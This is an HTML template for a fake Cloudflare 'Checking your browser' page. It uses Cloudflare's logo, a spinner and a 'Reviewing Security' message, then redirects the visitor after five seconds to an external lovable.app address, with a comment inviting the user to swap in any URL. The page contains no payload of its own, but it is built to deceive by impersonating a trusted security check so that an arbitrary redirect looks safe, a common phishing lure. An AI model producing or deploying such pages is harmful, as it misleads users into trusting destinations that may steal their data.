<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Checking your browser...</title>
  <style>
    body {
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 10%;
      color: #333;
    }

    .spinner {
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 6px solid #ccc;
      border-top: 6px solid #29d;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    .text {
      font-size: 1.2em;
    }
  </style>
</head>
<body>

  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Cloudflare_Logo.svg/2560px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" class="logo">
  <div class="text">Reviewing Security, please wait...</div>
  <div class="spinner"></div>

  <script>
    // Redirect after 5 seconds
    setTimeout(() => {
      window.location.href = "https://discord-hook-maker.lovable.app/"; // ðŸ‘ˆ Replace with your URL
    }, 5000);
  </script>

</body>
</html>
